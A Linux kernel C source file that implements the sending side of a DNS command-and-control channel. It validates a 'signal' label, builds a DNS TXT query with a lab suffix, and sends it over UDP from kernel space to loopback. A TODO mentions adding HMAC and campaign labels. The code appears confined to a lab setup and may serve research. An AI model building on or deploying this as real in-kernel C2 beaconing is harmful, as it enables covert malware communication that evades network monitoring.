// SPDX-License-Identifier: GPL-2.0
#include "dns_c2.h"
#include <linux/ctype.h>
#include <linux/in.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/unaligned.h>
#include <net/net_namespace.h>

#define DNS_PACKET_SIZE 512
#define DNS_FLAG_RD     0x0100
#define DNS_TYPE_TXT    16
#define DNS_CLASS_IN    1

struct dns_header {
	__be16 id;
	__be16 flags;
	__be16 questions;
	__be16 answers;
	__be16 authorities;
	__be16 additional;
} __packed;

static bool valid_label(const char *label)
{
	size_t index;

	for (index = 0; label[index]; index++) {
		if (index == DNS_LABEL_MAX)
			return false;
		if (!isalnum(label[index]) && label[index] != '-')
			return false;
	}
	return index && label[0] != '-' && label[index - 1] != '-';
}

static int append_label(u8 *packet, size_t size, size_t *offset,
			const char *label)
{
	size_t length = strlen(label);

	if (!length || length > DNS_LABEL_MAX ||
	    *offset + 1 + length > size)
		return -ENOSPC;
	packet[(*offset)++] = length;
	memcpy(packet + *offset, label, length);
	*offset += length;
	return 0;
}

static int build_name(u8 *packet, size_t size, size_t *offset,
		      const char *signal, u64 bucket, char *query,
		      size_t query_size)
{
	int error;

	(void)bucket;
	/* TODO: add the HMAC and campaign labels between signal and suffix. */
	error = append_label(packet, size, offset, signal);
	if (!error)
		error = append_label(packet, size, offset, DNS_LAB_SUFFIX);
	if (!error)
		snprintf(query, query_size, "%s.%s", signal, DNS_LAB_SUFFIX);
	return error;
}

int dns_send(const char *signal, u64 bucket, char *query, size_t query_size,
	     int *sent, u16 *transaction_id)
{
	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(DNS_LAB_PORT),
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	struct msghdr message = {
		.msg_name = &address,
		.msg_namelen = sizeof(address),
	};
	struct dns_header *header;
	struct socket *socket;
	struct kvec vector;
	u8 packet[DNS_PACKET_SIZE] = {};
	size_t offset = sizeof(*header);
	u16 id;
	int error;

	if (!valid_label(signal))
		return -EINVAL;
	error = build_name(packet, sizeof(packet), &offset, signal, bucket,
			   query, query_size);
	if (error)
		return error;
	if (offset + 1 + 2 * sizeof(__be16) > sizeof(packet))
		return -ENOSPC;
	packet[offset++] = 0;
	put_unaligned_be16(DNS_TYPE_TXT, packet + offset);
	offset += sizeof(__be16);
	put_unaligned_be16(DNS_CLASS_IN, packet + offset);
	offset += sizeof(__be16);

	id = get_random_u16();
	header = (void *)packet;
	header->id = htons(id);
	header->flags = htons(DNS_FLAG_RD);
	header->questions = htons(1);

	error = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP,
				 &socket);
	if (error)
		return error;
	vector.iov_base = packet;
	vector.iov_len = offset;
	error = kernel_sendmsg(socket, &message, &vector, 1, offset);
	sock_release(socket);
	if (error < 0)
		return error;
	if (error != offset)
		return -EIO;

	*sent = error;
	*transaction_id = id;
	return 0;
}
